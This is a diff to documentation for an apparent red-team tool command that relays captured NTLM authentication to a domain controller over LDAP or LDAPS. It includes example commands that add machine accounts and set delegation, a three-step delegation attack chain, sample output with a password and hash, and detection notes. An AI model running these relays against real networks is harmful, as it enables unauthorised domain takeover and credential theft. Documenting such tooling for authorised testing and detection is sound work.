@@ -29,7 +29,7 @@ In relay mode, the agent acts as a man-in-the-middle: it presents an HTTP 401 ch
 | protocols | No | llmnr,nbtns | Poison: protocols (llmnr,nbtns,mdns). LDAP-relay: operation spec (see below) |
 | interface | No | auto-detect | Network interface name or IP address |
 | duration | No | 30 (capture) / 120 (poison/relay/ldap-relay) | Duration in seconds. Max: 300 (capture), 600 (poison/relay/ldap-relay) |
-| ports | No | 21,53,80,88,110,143,389,445,8080 | Capture: port filter. Relay: `listen:target` (default 80:445). LDAP-relay: `listen:target` (default 80:389) |
+| ports | No | 21,53,80,88,110,143,389,445,8080 | Capture: port filter. Relay: `listen:target` (default 80:445). LDAP-relay: `listen:target` (default 80:389). Use 636 for LDAPS (required for add-computer) |
 | promiscuous | No | false | Enable promiscuous mode (capture only) |
 | max_bytes | No | 52428800 (50MB) | Stop after N bytes (capture only) |
 | save_pcap | No | false | Save raw PCAP file (capture only) |
@@ -93,9 +93,9 @@ sniff -action relay -response_ip 192.168.1.10 -ports 8080:445 -duration 300
 sniff -action ldap-relay -response_ip dc01.corp.local -duration 120
 ```
 
-### LDAP Relay — add a machine account
+### LDAP Relay — add a machine account (requires LDAPS for password set)
 ```
-sniff -action ldap-relay -response_ip dc01.corp.local -protocols add-computer:FAWKES$
+sniff -action ldap-relay -response_ip dc01.corp.local -ports 80:636 -protocols add-computer:FAWKES$
 ```
 
 ### LDAP Relay — set RBCD delegation
@@ -186,7 +186,7 @@ Set the operation via the `-protocols` parameter:
   "duration": "120.0s",
   "listen_port": 80,
   "target": "dc01.corp.local",
-  "target_port": 389,
+  "target_port": 636,
   "operation": "add-computer",
   "relays": [
     {
@@ -197,8 +197,8 @@ Set the operation via the `-protocols` parameter:
       "success": true,
       "hashcat": "jsmith::CORP:1122334455667788:aabbccdd...:0101...",
       "status": "authenticated",
-      "detail": "Relayed CORP\\jsmith to LDAP dc01.corp.local:389 | add-computer SUCCESS: created FAWKES$ at CN=FAWKES,CN=Computers,DC=corp,DC=local",
-      "op_result": "add-computer SUCCESS: created FAWKES$ at CN=FAWKES,CN=Computers,DC=corp,DC=local"
+      "detail": "Relayed CORP\\jsmith to LDAP dc01.corp.local:636 | add-computer SUCCESS: created FAWKES$ at CN=FAWKES,CN=Computers,DC=corp,DC=local | password=xK9#mPq2Rw7$nL4v | SID=S-1-5-21-3623811015-3361044348-30300820-1601",
+      "op_result": "add-computer SUCCESS: created FAWKES$ at CN=FAWKES,CN=Computers,DC=corp,DC=local | password=xK9#mPq2Rw7$nL4v | SID=S-1-5-21-3623811015-3361044348-30300820-1601"
     }
   ],
   "credentials": [
@@ -217,7 +217,8 @@ Set the operation via the `-protocols` parameter:
 
 The LDAP relay RBCD operation enables a resource-based constrained delegation attack:
 
-1. **Add a computer account** (if MachineAccountQuota > 0): `sniff -action ldap-relay -response_ip dc01 -protocols add-computer:EVIL$`
+1. **Add a computer account** (if MachineAccountQuota > 0): `sniff -action ldap-relay -response_ip dc01 -ports 80:636 -protocols add-computer:EVIL$`
+   - Output includes the generated password and SID for the new account
 2. **Set RBCD** on the target: `sniff -action ldap-relay -response_ip dc01 -protocols rbcd:CN=TARGET,DC=corp,DC=local|S-1-5-21-...-computerSID`
 3. Use `ticket -action s4u` to request a service ticket as any user to the target
 
@@ -370,6 +371,7 @@ JSON output with capture statistics and discovered credentials:
 - Opens an HTTP TCP listener — same detection surface as SMB relay
 - Generates LDAP NTLM bind traffic to the target DC — visible in DC security logs
 - **Requires LDAP signing not required** — default Windows Server configuration, but may be hardened
+- **LDAPS (port 636)** required for operations that set passwords (add-computer). Use `-ports 80:636` for LDAPS targeting
 - Post-auth operations create detectable AD changes:
   - `add-computer`: Event ID 5137 (directory object created), new computer account in CN=Computers
   - `rbcd`: Event ID 5136 (directory object modified), changes to `msDS-AllowedToActOnBehalfOfOtherIdentity`
